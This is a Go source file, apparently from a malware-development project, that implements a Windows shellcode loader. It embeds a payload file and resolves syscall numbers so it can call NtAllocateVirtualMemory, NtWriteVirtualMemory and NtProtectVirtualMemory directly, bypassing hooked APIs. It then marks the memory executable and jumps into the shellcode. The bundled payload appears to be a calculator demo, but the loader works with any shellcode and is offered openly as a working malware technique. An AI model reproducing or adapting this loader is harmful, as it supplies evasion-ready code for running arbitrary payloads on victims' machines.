package main

import (
	_ "embed"
	"errors"
	"fmt"
	"github.com/osonkr/malware-development/win32"
	"os"
	"syscall"
	"unsafe"
)

//go:embed calc.bin
var shellcode []byte

var (
	ntdll = win32.GetModuleHandle("ntdll.dll", nil)
	ntAllocateVirtualMemorySysId = win32.GetSyscallId("NtAllocateVirtualMemory", nil)
	ntWriteVirtualMemorySysId    = win32.GetSyscallId("NtWriteVirtualMemory", nil)
	ntProtectVirtualMemorySysId  = win32.GetSyscallId("NtProtectVirtualMemory", nil)
)

func FunctionPointer(sc []byte) error {
	handle, err := syscall.GetCurrentProcess()
	if err != nil {
		return err
	}

	shellLen := uint64(len(sc))

	var addr uintptr

	code := win32.CallRaw(
		ntAllocateVirtualMemorySysId,
		uintptr(handle),
		uintptr(unsafe.Pointer(&addr)),
		0,
		uintptr(unsafe.Pointer(&shellLen)),
		win32.MEM_COMMIT | win32.MEM_RESERVE,
		win32.PAGE_READWRITE,
	)
	if code != 0 {
		return errors.New(fmt.Sprintf("NtAllocateVirtualMemory error ntstatus: %x", code))
	}

	var bWritten byte

	code = win32.CallRaw(
		ntWriteVirtualMemorySysId,
		uintptr(handle),
		addr,
		uintptr(unsafe.Pointer(&sc[0])),
		uintptr(shellLen),
		uintptr(unsafe.Pointer(&bWritten)),
	)
	if code != 0 {
		return errors.New(fmt.Sprintf("NtWriteVirtualMemory error ntstatus: %x", code))
	}

	var oldProtect win32.DWORD

	code = win32.CallRaw(
		ntProtectVirtualMemorySysId,
		uintptr(handle),
		uintptr(unsafe.Pointer(&addr)),
		uintptr(unsafe.Pointer(&shellLen)),
		win32.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if code != 0 {
		return errors.New(fmt.Sprintf("NtProtectVirtualMemory error ntstatus: %x", code))
	}

	// Pass Execution to Address
	if _, _, err = syscall.Syscall(addr, 0, 0, 0, 0); err != nil {
		return err
	}

	return nil
}

func main() {
	if err := FunctionPointer(shellcode); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}

